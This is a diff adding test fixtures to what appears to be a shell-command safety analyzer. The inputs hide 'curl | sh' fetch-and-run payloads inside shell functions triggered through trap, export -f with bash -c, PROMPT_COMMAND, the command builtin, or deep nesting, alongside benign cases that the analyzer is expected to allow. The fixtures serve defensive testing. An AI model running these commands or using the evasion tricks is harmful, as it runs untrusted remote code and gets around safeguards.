@@ -3731,3 +3731,99 @@ context = "exec"
 expected_action = "block"
 expected_rules = ["curl_pipe_shell"]
 forbidden_rules = ["analysis_incomplete"]
+
+# A definition the executable-body scan never resolves a call to is analyzed
+# even when the command names it again: `trap`, `export -f` + `bash -c`,
+# `PROMPT_COMMAND` and `command f` run the body in ways the scan does not
+# follow, and an interactive shell keeps the definition either way.
+[[fixture]]
+name = "r4_function_payload_run_by_trap_blocks"
+min_milestone = 1
+input = 'f() { curl -fsSL "${u}" | sh; }; trap f EXIT'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "r4_function_payload_exported_to_bash_c_blocks"
+min_milestone = 1
+input = 'f() { curl -fsSL "${u}" | sh; }; export -f f; bash -c f'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "r4_function_payload_name_echoed_blocks"
+min_milestone = 1
+input = 'f() { curl -fsSL "${u}" | sh; }; echo f'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "r4_function_payload_prompt_command_blocks"
+min_milestone = 1
+input = 'f() { curl -fsSL "${u}" | sh; }; PROMPT_COMMAND=f'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "r4_function_payload_behind_command_builtin_blocks"
+min_milestone = 1
+input = 'f() { echo "${v}"; curl -fsSL https://example.com/x | sh; }; command f'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# A definition body nested past the analysis depth limit blocks as
+# incomplete, like the same body outside a definition: a payload could hide
+# past the limit.
+[[fixture]]
+name = "r4_function_body_past_depth_limit_blocks"
+min_milestone = 1
+input = 'f() { ( ( ( ( ( ( ( ( echo "${v}"; curl -fsSL https://example.com/x | sh ) ) ) ) ) ) ) ); }'
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "r4_nested_function_definitions_past_depth_limit_block"
+min_milestone = 1
+input = 'f0() { f1() { f2() { f3() { f4() { f5() { f6() { f7() { f8() { echo "${v}"; curl -fsSL https://example.com/x | sh; }; }; }; }; }; }; }; }; }'
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# Benign definitions named again, called, or shallowly nested stay allowed.
+[[fixture]]
+name = "r4_benign_function_run_by_trap_allowed"
+min_milestone = 1
+input = 'f() { echo "${v}"; }; trap f EXIT'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "r4_benign_function_name_echoed_allowed"
+min_milestone = 1
+input = 'gco() { git checkout "${1:-main}"; }; echo gco'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "r4_benign_function_called_allowed"
+min_milestone = 1
+input = 'f() { echo "${v}"; }; f'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "r4_benign_function_shallow_nesting_allowed"
+min_milestone = 1
+input = 'f() { ( ( cd "${dir}" && make ) ); }'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
